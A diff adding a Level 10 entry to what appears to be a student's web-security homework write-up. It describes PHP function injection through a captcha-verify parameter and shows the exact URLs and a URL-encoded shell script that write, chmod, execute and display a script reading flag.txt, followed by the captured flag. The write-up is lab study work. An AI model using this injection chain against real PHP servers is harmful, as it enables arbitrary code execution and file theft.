@@ -108,6 +108,44 @@ After launching burp, turn off intercept and navigate to the contactus page (htt
 
 ## Level 10
 ### Vulnerability:
-[insert vulnerability here]
+The author of the webpage allows a user to append the contents of the flag.txt file to their PHP session file by using a script.
 ### Description:
-[insert description here]
+The first thing I did upon opening up the problem was inspect the source code of the website. Like problem 9, the contactus webpage randomly generates a number, this time it is stored in a PHP session file. By navigating to the captcha page using the URL: http://hw1.kapravelos.com:8090/?page=captcha I could see the randomly generated value.
+
+When inspecting the captcha-verify case in the switch statement, I noticed that the request looks for 2 URL parameters. First, it checks that the value of 'answer' is set to something. Then it checks that the value of 'method' is set to something. Finally, it checks if the function provided by the parameter 'method' is enabled in the configurations. If so, it calls the function from 'method', passing it the value of the random session file, and the value of 'answer'.
+
+I needed functions that accept 2 arguments (filename, variable), and was enabled by the php configurations.
+
+I used the following functions: file_put_contents, chmod, highlight_file, and popen.
+
+First, I wrote a shell script to cat the contents of the flag.txt file, and then append it to my randomly generated session file.
+
+This is the script that was used:
+
+#!/bin/sh
+cat /var/www/html/flag.txt>> "./605521";
+
+Using this website: https://www.urlencoder.org/ I encoded my script to standard URL encoding schemes. Note: The website that generates the URL encoding inserts %0D%0A as the newline character, I removed the %0D to ensure it was compatible with Linux systems.
+
+This provided me with the URL code: %23%21%2Fbin%2Fsh%0Acat%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt%3E%3E%20%22.%2F605521%22%3B
+
+By then navigating to the captcha-verify page and inserting file_put_contents for 'method' and the above code for 'answer', I was able to append the contents of the flag to my session file. The URL used was:
+
+http://hw1.kapravelos.com:8090/?page=captcha-verify&method=file_put_contents&answer=%23%21%2Fbin%2Fsh%0Acat%20%2Fvar%2Fwww%2Fhtml%2Fflag.txt%3E%3E%20%22.%2F605521%22%3B
+
+Now that I have the contents of the file appended to my session file, I need give myself permissions to execute the script using the chmod function. I set the value of 'method' to chmod and the value of 'answer' to 511 to give myself execute permissions. I used the following URL:
+
+http://hw1.kapravelos.com:8090/?page=captcha-verify&method=chmod&answer=511
+
+Once I gave myself permission to execute my script, I executed it with popen in mode 'r' to allow the contents of the flag file to be appended to my script. I set 'method' to popen and 'answer' to r using the following URL:
+
+http://hw1.kapravelos.com:8090/?page=captcha-verify&method=popen&answer=r
+
+Finally, I printed the contents of my script using the highlight_file function, showing the contents of my script on the webpage using the following URL:
+
+http://hw1.kapravelos.com:8090/?page=captcha-verify&method=highlight_file&answer=
+
+The following text containing the flag was displayed:
+
+#!/bin/sh
+cat /var/www/html/flag.txt>> "./605521";flag{inj3ctingPHPinS3SSI0NSis3vil}
